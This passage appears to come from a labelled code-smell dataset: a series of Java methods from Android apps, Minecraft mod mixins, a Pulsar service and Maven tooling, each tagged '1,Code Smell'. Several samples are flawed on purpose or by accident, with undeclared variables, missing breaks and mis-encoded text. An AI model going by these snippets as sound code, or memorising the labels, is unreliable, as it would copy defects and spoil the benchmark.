      throw new TeaException(TeaConverter.buildMap(new TeaPair(""message"",""楠岀澶辫触锛岃妫�鏌ユ敮浠樺疂鍏挜璁剧疆鏄惁姝ｇ‘銆�"")));
    }
 catch (    Exception e) {
      if (Tea.isRetryable(e)) {
        continue;
      }
      throw e;
    }
  }
  throw new TeaUnretryableException(_lastRequest);
}",1,Code Smell
"private void startBatchDeletion(@NonNull List<Path> paths){
  AtomicReference<Future<?>> deletionThread=new AtomicReference<>();
  View view=View.inflate(requireContext(),R.layout.dialog_progress,null);
  LinearProgressIndicator progress=view.findViewById(R.id.progress_linear);
  TextView label=view.findViewById(android.R.id.text1);
  TextView counter=view.findViewById(android.R.id.text2);
  counter.setText(String.format(Locale.getDefault(),""%d/%d"",0,paths.size()));
  AlertDialog dialog=new MaterialAlertDialogBuilder(requireContext()).setTitle(R.string.delete).setView(view).setPositiveButton(R.string.action_stop_service,(dialog1,which) -> {
    if (deletionThread.get() != null) {
      deletionThread.get().cancel(true);
    }
  }
).setCancelable(false).show();
  deletionThread.set(ThreadUtils.postOnBackgroundThread(() -> {
    WeakReference<LinearProgressIndicator> progressRef=new WeakReference<>(progress);
    WeakReference<TextView> labelRef=new WeakReference<>(label);
    WeakReference<TextView> counterRef=new WeakReference<>(counter);
    WeakReference<AlertDialog> dialogRef=new WeakReference<>(dialog);
    try {
      LinearProgressIndicator p=progressRef.get();
      if (p != null) {
        p.setMax(paths.size());
        p.setProgress(0);
        p.setIndeterminate(false);
      }
      int i=1;
      for (      Path path : paths) {
        TextView l=labelRef.get();
        if (l != null) {
          ThreadUtils.postOnMainThread(() -> l.setText(path.getName()));
        }
        if (ThreadUtils.isInterrupted()) {
          break;
        }
        SystemClock.sleep(2_000);
        if (ThreadUtils.isInterrupted()) {
          break;
        }
        path.delete();
        TextView c=counterRef.get();
        int finalI=i;
        ThreadUtils.postOnMainThread(() -> {
          if (c != null) {
            c.setText(String.format(Locale.getDefault(),""%d/%d"",finalI,paths.size()));
          }
          if (p != null) {
            p.setProgress(finalI);
          }
        }
);
        ++i;
        if (ThreadUtils.isInterrupted()) {
          break;
        }
      }
    }
  finally {
      AlertDialog d=dialogRef.get();
      if (d != null) {
        ThreadUtils.postOnMainThread(() -> {
          d.dismiss();
          UIUtils.displayShortToast(R.string.deleted_successfully);
          mModel.reload();
        }
);
      }
    }
  }
));
}",1,Code Smell
"private void createVideoTextureView(MediaController.SavedFilterState savedFilterState){
  if (videoTextureView != null) {
    return;
  }
  aspectRatioFrameLayout=new AspectRatioFrameLayout(parentActivity){
    @Override protected void onMeasure(    int widthMeasureSpec,    int heightMeasureSpec){
      super.onMeasure(widthMeasureSpec,heightMeasureSpec);
      if (textureImageView != null) {
        ViewGroup.LayoutParams layoutParams=textureImageView.getLayoutParams();
        layoutParams.width=getMeasuredWidth();
        layoutParams.height=getMeasuredHeight();
      }
      if (videoTextureView instanceof VideoEditTextureView) {
        videoTextureView.setPivotX(videoTextureView.getMeasuredWidth() / 2);
        firstFrameView.setPivotX(videoTextureView.getMeasuredWidth() / 2);
      }
 else {
        videoTextureView.setPivotX(0);
        firstFrameView.setPivotX(0);
      }
      checkFullscreenButton();
    }
    @Override protected boolean drawChild(    Canvas canvas,    View child,    long drawingTime){
      if (child == lastFrameImageView && skipLastFrameDraw) {
        return true;
      }
      return super.drawChild(canvas,child,drawingTime);
    }
  }
;
  aspectRatioFrameLayout.setWillNotDraw(false);
  aspectRatioFrameLayout.setVisibility(View.INVISIBLE);
  containerView.addView(aspectRatioFrameLayout,0,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT,Gravity.CENTER));
  if (imagesArrLocals.isEmpty()) {
    videoTextureView=new TextureView(parentActivity);
  }
 else {
    VideoEditTextureView videoEditTextureView=new VideoEditTextureView(parentActivity,videoPlayer);
    if (savedFilterState != null) {
      videoEditTextureView.setDelegate(thread -> thread.setFilterGLThreadDelegate(FilterShaders.getFilterShadersDelegate(savedFilterState)));
    }
    videoTextureView=videoEditTextureView;
  }
  if (injectingVideoPlayerSurface != null) {
    videoTextureView.setSurfaceTexture(injectingVideoPlayerSurface);
    textureUploaded=true;
    videoSizeSet=true;
    injectingVideoPlayerSurface=null;
  }
  videoTextureView.setPivotX(0);
  videoTextureView.setPivotY(0);
  videoTextureView.setOpaque(false);
  aspectRatioFrameLayout.addView(videoTextureView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT,Gravity.CENTER));
  firstFrameView=new FirstFrameView(parentActivity);
  firstFrameView.setPivotX(0);
  firstFrameView.setPivotY(0);
  firstFrameView.setScaleType(ImageView.ScaleType.FIT_XY);
  aspectRatioFrameLayout.addView(firstFrameView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT,Gravity.CENTER));
  if (sendPhotoType == SELECT_TYPE_AVATAR) {
    flashView=new View(parentActivity);
    flashView.setBackgroundColor(0xffffffff);
    flashView.setAlpha(0.0f);
    aspectRatioFrameLayout.addView(flashView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT,Gravity.CENTER));
  }
}",1,Code Smell
"@Override public void head(@NonNull Node node,int depth){
  if (node instanceof TextNode) {
    ssb.append(textNode.text());
  }
 else   if (node instanceof Element) {
switch (el.nodeName()) {
case ""a"":
{
        Object linkObject=null;
        String href=el.attr(""href"");
        LinkSpan.Type linkType;
        if (el.hasClass(""hashtag"")) {
          String text=el.text();
          if (text.startsWith(""#"")) {
            linkType=LinkSpan.Type.HASHTAG;
            href=text.substring(1);
            linkObject=tagsByTag.get(text.substring(1).toLowerCase());
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else         if (el.hasClass(""mention"")) {
          String id=idsByUrl.get(href);
          if (id != null) {
            linkType=LinkSpan.Type.MENTION;
            href=id;
            linkObject=mentionsByID.get(id);
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else {
          linkType=LinkSpan.Type.URL;
        }
        openSpans.add(new SpanInfo(new LinkSpan(href,null,linkType,accountID,linkObject,parentObject),ssb.length(),el));
      }
case ""br"":
    ;
case ""span"":
{
    if (el.hasClass(""invisible"")) {
      openSpans.add(new SpanInfo(new InvisibleSpan(),ssb.length(),el));
    }
  }
}
}
}
@Override public void head(Node node,int depth){
  if (node instanceof TextNode) {
    sb.append(tn.text());
  }
 else   if (node instanceof Element) {
    if (""br"".equals(el.tagName())) {
      sb.append('\n');
    }
  }
}",1,Code Smell
"public static Object invokeVirtualAny(Object obj,Object... argsTypesAndReturnType) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IllegalArgumentException {
  Class clazz=obj.getClass();
  int argc=argsTypesAndReturnType.length / 2;
  Class[] argt=new Class[argc];
  Object[] argv=new Object[argc];
  Class returnType=null;
  if (argc * 2 + 1 == argsTypesAndReturnType.length) {
    returnType=(Class)argsTypesAndReturnType[argsTypesAndReturnType.length - 1];
  }
  int i, ii;
  Method[] m;
  Method method=null;
  Class[] _argt;
  for (i=0; i < argc; i++) {
    argt[i]=(Class)argsTypesAndReturnType[argc + i];
    argv[i]=argsTypesAndReturnType[i];
  }
  do {
    m=clazz.getDeclaredMethods();
    loop:     for (i=0; i < m.length; i++) {
      _argt=m[i].getParameterTypes();
      if (_argt.length == argt.length) {
        for (ii=0; ii < argt.length; ii++) {
          if (!argt[ii].equals(_argt[ii])) {
            continue loop;
          }
        }
        if (returnType != null && !returnType.equals(m[i].getReturnType())) {
          continue;
        }
        if (method == null) {
          method=m[i];
        }
 else {
          throw new NoSuchMethodException(""Multiple methods found for __attribute__((any))"" + paramsTypesToString(argt) + "" in ""+ obj.getClass().getName());
        }
      }
    }
  }
 while (method == null && !Object.class.equals(clazz=clazz.getSuperclass()));
  if (method == null) {
    throw new NoSuchMethodException(""__attribute__((a))"" + paramsTypesToString(argt) + "" in ""+ obj.getClass().getName());
  }
  method.setAccessible(true);
  return method.invoke(obj,argv);
}",1,Code Smell
"/** 
 * Verify whether the specified Topic exists under the specified Tenant/Namespace
 * @apiNote cannot compare whether the string contains, otherwise it may be misjudged, such as:Topic ""ab"" does not exist, but if ""abc"" exists, ""ab"" will be mistakenly judged to exist
 */
public boolean topicExists(PulsarClusterInfo pulsarClusterInfo,String tenant,String namespace,String topicName,boolean isPartitioned){
  if (StringUtils.isBlank(topicName)) {
    return true;
  }
  List<String> topics;
  boolean topicExists=false;
  try {
    if (isPartitioned) {
      topics=PulsarUtils.getPartitionedTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
    }
 else {
      topics=PulsarUtils.getTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
    }
    for (    String t : topics) {
      t=t.substring(t.lastIndexOf(""/"") + 1);
      if (!isPartitioned) {
        int suffixIndex=t.lastIndexOf(""-partition-"");
        if (suffixIndex > 0) {
          t=t.substring(0,suffixIndex);
        }
      }
      if (topicName.equals(t)) {
        topicExists=true;
        break;
      }
    }
  }
 catch (  Exception pe) {
    LOGGER.error(""check if the pulsar topic={} exists error, begin retry"",topicName,pe);
    int count=0;
    try {
      while (!topicExists && ++count <= RETRY_TIMES) {
        LOGGER.info(""check whether the pulsar topic={} exists error, try count={}"",topicName,count);
        Thread.sleep(DELAY_SECONDS);
        topics=PulsarUtils.getPartitionedTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
        for (        String t : topics) {
          t=t.substring(t.lastIndexOf(""/"") + 1);
          if (topicName.equals(t)) {
            topicExists=true;
            break;
          }
        }
      }
    }
 catch (    Exception e) {
      LOGGER.error(""after retry, check if the pulsar topic={} exists still error"",topicName,pe);
    }
  }
  return topicExists;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public void tick(){
  --this.lookForFriends;
  if (this.lookForFriends <= 0) {
    Level world=this.silverfish.level();
    RandomSource random=this.silverfish.getRandom();
    BlockPos blockpos=this.silverfish.blockPosition();
    for (int i=0; i <= 5 && i >= -5; i=(i <= 0 ? 1 : 0) - i) {
      for (int j=0; j <= 10 && j >= -10; j=(j <= 0 ? 1 : 0) - j) {
        for (int k=0; k <= 10 && k >= -10; k=(k <= 0 ? 1 : 0) - k) {
          BlockPos blockpos1=blockpos.offset(j,i,k);
          BlockState blockstate=world.getBlockState(blockpos1);
          Block block=blockstate.getBlock();
          if (block instanceof InfestedBlock) {
            if (!CraftEventFactory.callEntityChangeBlockEvent(this.silverfish,blockpos1,Blocks.AIR.defaultBlockState())) {
              continue;
            }
            if (((WorldBridge)world).bridge$forge$mobGriefing(this.silverfish)) {
              if (ArclightVersion.atLeast(ArclightVersion.v1_15)) {
                world.destroyBlock(blockpos1,true,this.silverfish);
              }
 else {
                world.destroyBlock(blockpos1,true);
              }
            }
 else {
              world.setBlock(blockpos1,((InfestedBlock)block).getHostBlock().defaultBlockState(),3);
            }
            if (random.nextBoolean()) {
              return;
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"private void updateBotCommandsMenuContainerTopPadding(){
  if (botCommandsMenuContainer == null) {
    return;
  }
  int padding;
  final int viewsCount=botCommandsMenuContainer.listView.getChildCount();
  int measuredFourViewsHeight=0;
  for (int i=0; i < viewsCount; i++) {
    final View child=botCommandsMenuContainer.listView.getChildAt(i);
    if (i < 4) {
      measuredFourViewsHeight+=child.getMeasuredHeight();
    }
  }
  if (measuredFourViewsHeight > 0) {
    padding=Math.max(0,sizeNotifierLayout.getMeasuredHeight() - measuredFourViewsHeight - dp(8)- dp(viewsCount > 4 ? 12 : 0));
  }
 else {
    if (botCommandsAdapter.getItemCount() > 4) {
      padding=Math.max(0,sizeNotifierLayout.getMeasuredHeight() - dp(8 + 36 * 4.3f));
    }
 else {
      padding=Math.max(0,sizeNotifierLayout.getMeasuredHeight() - dp(8 + 36 * Math.max(1,Math.min(4,botCommandsAdapter.getItemCount()))));
    }
  }
  if (botCommandsMenuContainer.listView.getPaddingTop() != padding) {
    botCommandsMenuContainer.listView.setTopGlowOffset(padding);
    if (botCommandLastPosition == -1 && botCommandsMenuContainer.getVisibility() == View.VISIBLE && botCommandsMenuContainer.listView.getLayoutManager() != null) {
      LinearLayoutManager layoutManager=(LinearLayoutManager)botCommandsMenuContainer.listView.getLayoutManager();
      int p=layoutManager.findFirstVisibleItemPosition();
      if (p >= 0) {
        View view=layoutManager.findViewByPosition(p);
        if (view != null) {
          botCommandLastPosition=p;
          botCommandLastTop=view.getTop() - botCommandsMenuContainer.listView.getPaddingTop();
        }
      }
    }
    botCommandsMenuContainer.listView.setPadding(0,padding,0,dp(8));
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public InteractionResult use(BlockState p_49515_,Level level,BlockPos p_49517_,Player p_49518_,InteractionHand p_49519_,BlockHitResult p_49520_){
  if (level.isClientSide) {
    return InteractionResult.CONSUME;
  }
 else {
    if (p_49515_.getValue(PART) != BedPart.HEAD) {
      p_49517_=p_49517_.relative(p_49515_.getValue(FACING));
      p_49515_=level.getBlockState(p_49517_);
      if (!p_49515_.is((BedBlock)(Object)this)) {
        return InteractionResult.CONSUME;
      }
    }
    if (p_49515_.getValue(OCCUPIED)) {
      if (!this.kickVillagerOutOfBed(level,p_49517_)) {
        p_49518_.displayClientMessage(Component.translatable(""block.minecraft.bed.occupied""),true);
      }
      return InteractionResult.SUCCESS;
    }
 else {
      var pos=p_49517_;
      var state=p_49515_;
      p_49518_.startSleepInBed(pos).ifLeft((p_49477_) -> {
        if (!level.dimensionType().bedWorks()) {
          level.removeBlock(pos,false);
          BlockPos blockpos=pos.relative(state.getValue(FACING).getOpposite());
          if (level.getBlockState(blockpos).is((BedBlock)(Object)this)) {
            level.removeBlock(blockpos,false);
          }
          Vec3 vec3d=pos.getCenter();
          level.explode(null,level.damageSources().badRespawnPointExplosion(vec3d),null,vec3d,5.0F,true,Level.ExplosionInteraction.BLOCK);
        }
 else         if (p_49477_.getMessage() != null) {
          p_49518_.displayClientMessage(p_49477_.getMessage(),true);
        }
      }
);
      return InteractionResult.SUCCESS;
    }
  }
}",1,Code Smell
"/** 
 * Authenticated USER: 1) users with ROLE SUPER_ADMIN/ADMIN, 2) members of the TEAM that the running/queued TestTask is in
 */
@GetMapping(value={""/api/test/task/cancel/{testId}""},produces=MediaType.APPLICATION_JSON_VALUE) public Result<Object> cancelTask(@CurrentSecurityContext SysUser requestor,@PathVariable(""testId"") String testId,@RequestParam(""reason"") String reason){
  try {
    if (requestor == null) {
      return Result.error(HttpStatus.UNAUTHORIZED.value(),""unauthorized"");
    }
    if (!LogUtils.isLegalStr(testId,Const.RegexString.UUID,false)) {
      return Result.error(HttpStatus.INTERNAL_SERVER_ERROR.value(),""Error param! Should be UUID"");
    }
    TestTaskQueuedInfo queuedInfo=testTaskService.getTestQueuedInfo(testId);
    TestTaskSpec queuedTaskSpec=queuedInfo.getTestTaskSpec();
    if (queuedTaskSpec != null) {
      if (!sysUserService.checkUserAdmin(requestor) && !userTeamManagementService.checkRequestorTeamRelation(requestor,queuedTaskSpec.teamId)) {
        return Result.error(HttpStatus.UNAUTHORIZED.value(),""Unauthorized, the TestTask doesn't belong to user's Teams"");
      }
      testTaskService.cancelTask(testId);
    }
 else {
      Task task=testDataService.getTaskDetail(testId);
      if (task == null) {
        return Result.error(HttpStatus.INTERNAL_SERVER_ERROR.value(),""The testId is wrong!"");
      }
 else       if (!sysUserService.checkUserAdmin(requestor) && !userTeamManagementService.checkRequestorTeamRelation(requestor,task.getTeamId())) {
        return Result.error(HttpStatus.UNAUTHORIZED.value(),""Unauthorized, the TestTask doesn't belong to user's Teams"");
      }
      deviceAgentManagementService.cancelTestTaskById(testId,reason);
      testTaskService.runTask();
    }
    if (!LogUtils.isLegalStr(testId,Const.RegexString.UUID,false)) {
      logger.warn(""test {} is canceled"",testId);
    }
  }
 catch (  Exception e) {
    return Result.error(HttpStatus.INTERNAL_SERVER_ERROR.value(),e.getMessage());
  }
  return Result.ok();
}",1,Code Smell
"/** 
 * Validate that directory is empty or contains only files in  {@code ignoredSubFilePaths}. If parent path of an ignored file exists, but ignored file itself does not exist, then directory is not considered empty.
 * @param label The optional label for directory to check. This can optionally be {@code null}.
 * @param filePath The {@code path} for directory to check.
 * @param ignoredSubFilePaths The list of absolute file paths under {@code filePath} dir.Validation is done for the paths.
 * @param ignoreNonExistentFile The {@code boolean} that decides if it should be considered anerror if file to be checked doesn't exist.
 * @return Returns {@code null} if directory is empty or contains only files in {@code ignoredSubFilePaths}. Returns  {@code FileUtilsErrno#ERRNO_NON_EMPTY_DIRECTORY_FILE} if a file was found that did notexist in the  {@code ignoredSubFilePaths}, otherwise returns an appropriate  {@code error} ifchecking was not successful.
 */
public static Error validateDirectoryFileEmptyOrOnlyContainsSpecificFiles(String label,String filePath,final List<String> ignoredSubFilePaths,final boolean ignoreNonExistentFile){
  label=(label == null || label.isEmpty() ? """" : label + "" "");
  if (filePath == null || filePath.isEmpty())   return FunctionErrno.ERRNO_NULL_OR_EMPTY_PARAMETER.getError(label + ""file path"",""isDirectoryFileEmptyOrOnlyContainsSpecificFiles"");
  try {
    File file=new File(filePath);
    FileType fileType=getFileType(filePath,false);
    if (fileType != FileType.NO_EXIST && fileType != FileType.DIRECTORY) {
      return FileUtilsErrno.ERRNO_NON_DIRECTORY_FILE_FOUND.getError(label + ""directory"",filePath).setLabel(label + ""directory"");
    }
    if (fileType == FileType.NO_EXIST) {
      if (ignoreNonExistentFile)       return null;
 else {
        label+=""directory to check if is empty or only contains specific files"";
        return FileUtilsErrno.ERRNO_FILE_NOT_FOUND_AT_PATH.getError(label,filePath).setLabel(label);
      }
    }
    File[] subFiles=file.listFiles();
    if (subFiles == null || subFiles.length == 0)     return null;
    if (ignoredSubFilePaths == null || ignoredSubFilePaths.size() == 0)     return FileUtilsErrno.ERRNO_NON_EMPTY_DIRECTORY_FILE.getError(label,filePath);
    if (nonIgnoredSubFileExists(subFiles,ignoredSubFilePaths)) {
      return FileUtilsErrno.ERRNO_NON_EMPTY_DIRECTORY_FILE.getError(label,filePath);
    }
  }
 catch (  Exception e) {
    return FileUtilsErrno.ERRNO_VALIDATE_DIRECTORY_EMPTY_OR_ONLY_CONTAINS_SPECIFIC_FILES_FAILED_WITH_EXCEPTION.getError(e,label + ""directory"",filePath,e.getMessage());
  }
  return null;
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(Scanned acc){
  return Preconditions.check(onlyIfUsing == null || acc.usingType && !acc.scopeByProject.isEmpty(),new MavenVisitor<ExecutionContext>(){
    @Nullable final Pattern familyPatternCompiled=familyPattern == null ? null : Pattern.compile(familyPattern.replace(""*"","".*""));
    @Override public Xml visitDocument(    Xml.Document document,    ExecutionContext ctx){
      Xml maven=super.visitDocument(document,ctx);
      JavaProject javaProject=document.getMarkers().findFirst(JavaProject.class).orElse(null);
      String maybeScope=javaProject == null ? null : acc.scopeByProject.get(javaProject);
      if (maybeScope == null && !acc.scopeByProject.isEmpty()) {
        return maven;
      }
      for (      ResolvedDependency d : getResolutionResult().getDependencies().get(Scope.Compile)) {
        if (hasAcceptableTransitivity(d,acc) && groupId.equals(d.getGroupId()) && artifactId.equals(d.getArtifactId())) {
          return maven;
        }
      }
      String resolvedScope=scope == null ? maybeScope : scope;
      Scope resolvedScopeEnum=Scope.fromName(resolvedScope);
      if (resolvedScopeEnum == Scope.Provided || resolvedScopeEnum == Scope.Test) {
        for (        ResolvedDependency d : getResolutionResult().getDependencies().get(resolvedScopeEnum)) {
          if (hasAcceptableTransitivity(d,acc) && groupId.equals(d.getGroupId()) && artifactId.equals(d.getArtifactId())) {
            return maven;
          }
        }
      }
      if (onlyIfUsing == null && getResolutionResult().getParent() != null && acc.pomsDefinedInCurrentRepository.contains(getResolutionResult().getParent().getPom().getGav())) {
        return maven;
      }
      return new AddDependencyVisitor(groupId,artifactId,version,versionPattern,resolvedScope,releasesOnly,type,classifier,optional,familyPatternCompiled,metadataFailures).visitNonNull(document,ctx);
    }
  }
);
}
",1,Code Smell
"public AggregateEntry parse(AnnotationExpr aggregateAnnotationExpr){
  AggregateEntry entry=new AggregateEntry();
  entry.setPackageName(packageDeclaration.getNameAsString());
  NormalAnnotationExpr expr=(NormalAnnotationExpr)aggregateAnnotationExpr;
  for (  MemberValuePair memberValuePair : expr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""name"":
      StringLiteralExpr nameExpr=(StringLiteralExpr)memberValuePair.getValue();
    entry.setName(nameExpr.getValue());
  break;
case ""problematical"":
entry.setProblematical(true);
break;
case ""root"":
if (memberValuePair.getValue() instanceof ArrayInitializerExpr) {
ArrayInitializerExpr roots=(ArrayInitializerExpr)memberValuePair.getValue();
boolean first=true;
for (Node node : roots.getValues()) {
ClassExpr classExpr=(ClassExpr)node;
if (first) {
  entry.setRootClass(classExpr.getTypeAsString());
  first=false;
}
 else {
  entry.addExtraRootClass(classExpr.getTypeAsString());
}
}
}
 else {
ClassExpr classExpr=(ClassExpr)memberValuePair.getValue();
entry.setRootClass(classExpr.getTypeAsString());
}
break;
}
}
return entry;
}
",1,Code Smell
"private void fetchRecentLocations(ArrayList<TLRPC.Message> messages){
  IMapsProvider.ILatLngBoundsBuilder builder=null;
  if (firstFocus) {
    builder=ApplicationLoader.getMapsProvider().onCreateLatLngBoundsBuilder();
  }
  int date=getConnectionsManager().getCurrentTime();
  for (int a=0; a < messages.size(); a++) {
    TLRPC.Message message=messages.get(a);
    if (message.date + message.media.period > date) {
      if (builder != null) {
        IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(message.media.geo.lat,message.media.geo._long);
        builder.include(latLng);
      }
      addUserMarker(message);
      if (proximityButton.getVisibility() != View.GONE && MessageObject.getFromChatId(message) != getUserConfig().getClientUserId()) {
        proximityButton.setVisibility(View.VISIBLE);
        proximityAnimationInProgress=true;
        proximityButton.animate().alpha(1.0f).scaleX(1.0f).scaleY(1.0f).setDuration(180).setListener(new AnimatorListenerAdapter(){
          @Override public void onAnimationEnd(          Animator animation){
            proximityAnimationInProgress=false;
            maybeShowProximityHint();
          }
        }
).start();
      }
    }
  }
  if (builder != null) {
    if (firstFocus) {
      listView.smoothScrollBy(0,dp(66 * 1.5f));
    }
    firstFocus=false;
    adapter.setLiveLocations(markers);
    if (messageObject.isLiveLocation()) {
      try {
        IMapsProvider.ILatLngBounds bounds=builder.build();
        IMapsProvider.LatLng center=bounds.getCenter();
        IMapsProvider.LatLng northEast=move(center,100,100);
        IMapsProvider.LatLng southWest=move(center,-100,-100);
        builder.include(southWest);
        builder.include(northEast);
        bounds=builder.build();
        if (messages.size() > 1) {
          try {
            moveToBounds=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngBounds(bounds,dp(80 + 33));
            map.moveCamera(moveToBounds);
            moveToBounds=null;
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
        }
      }
 catch (      Exception ignore) {
      }
    }
  }
}",1,Code Smell
"public static long getUpdateChannelId(TLRPC.Update update){
  if (update instanceof TLRPC.TL_updateNewChannelMessage) {
    return ((TLRPC.TL_updateNewChannelMessage)update).message.peer_id.channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateEditChannelMessage) {
    return ((TLRPC.TL_updateEditChannelMessage)update).message.peer_id.channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateReadChannelOutbox) {
    return ((TLRPC.TL_updateReadChannelOutbox)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelMessageViews) {
    return ((TLRPC.TL_updateChannelMessageViews)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelMessageForwards) {
    return ((TLRPC.TL_updateChannelMessageForwards)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelTooLong) {
    return ((TLRPC.TL_updateChannelTooLong)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelReadMessagesContents) {
    return ((TLRPC.TL_updateChannelReadMessagesContents)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelAvailableMessages) {
    return ((TLRPC.TL_updateChannelAvailableMessages)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannel) {
    return ((TLRPC.TL_updateChannel)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelWebPage) {
    return ((TLRPC.TL_updateChannelWebPage)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateDeleteChannelMessages) {
    return ((TLRPC.TL_updateDeleteChannelMessages)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateReadChannelInbox) {
    return ((TLRPC.TL_updateReadChannelInbox)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelPinnedTopic) {
    return ((TLRPC.TL_updateChannelPinnedTopic)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelPinnedTopics) {
    return ((TLRPC.TL_updateChannelPinnedTopics)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateReadChannelDiscussionInbox) {
    return ((TLRPC.TL_updateReadChannelDiscussionInbox)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateReadChannelDiscussionOutbox) {
    return ((TLRPC.TL_updateReadChannelDiscussionOutbox)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelUserTyping) {
    return ((TLRPC.TL_updateChannelUserTyping)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updatePinnedChannelMessages) {
    return ((TLRPC.TL_updatePinnedChannelMessages)update).channel_id;
  }
 else   if (update instanceof TLRPC.TL_updateChannelViewForumAsMessages) {
    return ((TLRPC.TL_updateChannelViewForumAsMessages)update).channel_id;
  }
 else {
    if (BuildVars.LOGS_ENABLED) {
      FileLog.e(""trying to get unknown update channel_id for "" + update);
    }
    return 0;
  }
}",1,Code Smell
"@Override public void onBindViewHolder(final RecyclerView.ViewHolder holder,int position){
  final ImageUrl imageUrl=mDataSet.get(position);
  if (imageUrl.isLazy()) {
    if (!imageUrl.isLoading() && mLazyLoadListener != null) {
      imageUrl.setLoading(true);
      mLazyLoadListener.onLoad(imageUrl);
    }
    return;
  }
  final DraweeView draweeView=((ImageHolder)holder).draweeView;
  PipelineDraweeControllerBuilder builder=isNeedResize(imageUrl) ? mLargeControllerSupplier.get() : mControllerSupplier.get();
switch (reader) {
case READER_PAGE:
    ((PhotoDraweeView)draweeView).setTapListenerListener(mTapGestureListener);
  ((PhotoDraweeView)draweeView).setAlwaysBlockParent(isBanTurn);
((PhotoDraweeView)draweeView).setDoubleTap(isDoubleTap);
((PhotoDraweeView)draweeView).setScaleFactor(mScaleFactor);
((PhotoDraweeView)draweeView).setScrollMode(isVertical ? PhotoDraweeView.MODE_VERTICAL : PhotoDraweeView.MODE_HORIZONTAL);
builder.setControllerListener(new BaseControllerListener<ImageInfo>(){
@Override public void onFinalImageSet(String id,ImageInfo imageInfo,Animatable animatable){
if (imageInfo != null) {
imageUrl.setSuccess(true);
((PhotoDraweeView)draweeView).update(imageUrl.getId());
}
}
}
);
break;
case READER_STREAM:
builder.setControllerListener(new BaseControllerListener<ImageInfo>(){
@Override public void onFinalImageSet(String id,ImageInfo imageInfo,Animatable animatable){
if (imageInfo != null) {
imageUrl.setSuccess(true);
if (isVertical) {
draweeView.getLayoutParams().height=ViewGroup.LayoutParams.WRAP_CONTENT;
}
 else {
draweeView.getLayoutParams().width=ViewGroup.LayoutParams.WRAP_CONTENT;
}
draweeView.setAspectRatio((float)imageInfo.getWidth() / imageInfo.getHeight());
}
}
}
);
break;
}
String[] urls=imageUrl.getUrls();
ImageRequest[] request=new ImageRequest[urls.length];
for (int i=0; i != urls.length; ++i) {
final String url=urls[i];
if (url == null) {
continue;
}
ImageRequestBuilder imageRequestBuilder=ImageRequestBuilder.newBuilderWithSource(Uri.parse(url)).setProgressiveRenderingEnabled(true);
MangaPostprocessor processor=new MangaPostprocessor(imageUrl,isPaging,isPagingReverse,isWhiteEdge);
imageRequestBuilder.setPostprocessor(processor);
if (!isCloseAutoResizeImage) {
ResizeOptions options=isVertical ? new ResizeOptions(App.mWidthPixels,App.mHeightPixels) : new ResizeOptions(App.mHeightPixels,App.mWidthPixels);
imageRequestBuilder.setResizeOptions(options);
}
imageRequestBuilder.setRequestListener(new BaseRequestListener(){
@Override public void onRequestSuccess(ImageRequest request,String requestId,boolean isPrefetch){
imageUrl.setUrl(url);
}
}
);
request[i]=imageRequestBuilder.build();
}
builder.setOldController(draweeView.getController()).setTapToRetryEnabled(true).setRetainImageOnFailure(true);
draweeView.setController(builder.setFirstAvailableImageRequests(request).build());
}",1,Code Smell
"private static String formatMessage(final String message){
  if (message.contains(OWNER_NAME_UNIQUE.getName())) {
    return ""Owner with this name already exists"";
  }
  if (message.contains(NAMESPACE_UNIQUE.getName())) {
    return ""Namespace with this name already exists"";
  }
  if (message.contains(DATA_SOURCE_NAME_UNIQUE.getName())) {
    return ""Data source with this name already exists"";
  }
  if (message.contains(DATA_SOURCE_ODDRN_UNIQUE.getName())) {
    return ""Data source with this oddrn already exists"";
  }
  if (message.contains(COLLECTOR_NAME_UNIQUE.getName())) {
    return ""Collector with this name already exists"";
  }
  if (message.contains(TAG_NAME_UNIQUE.getName())) {
    return ""Tag with this name already exists"";
  }
  if (message.contains(ROLE_NAME_UNIQUE.getName())) {
    return ""Role with this name already exists"";
  }
  if (message.contains(POLICY_NAME_UNIQUE.getName())) {
    return ""Policy with this name already exists"";
  }
  if (message.contains(IX_UNIQUE_INTERNAL_NAME.getName())) {
    return ""Internal metadata with this name already exists"";
  }
  if (message.contains(ENUM_VALUE_UNIQUE.getName())) {
    return ""Enum value with this name for current field already exists"";
  }
  if (message.contains(OWNERSHIP_DATA_ENTITY_ID_OWNER_ID_KEY.getName())) {
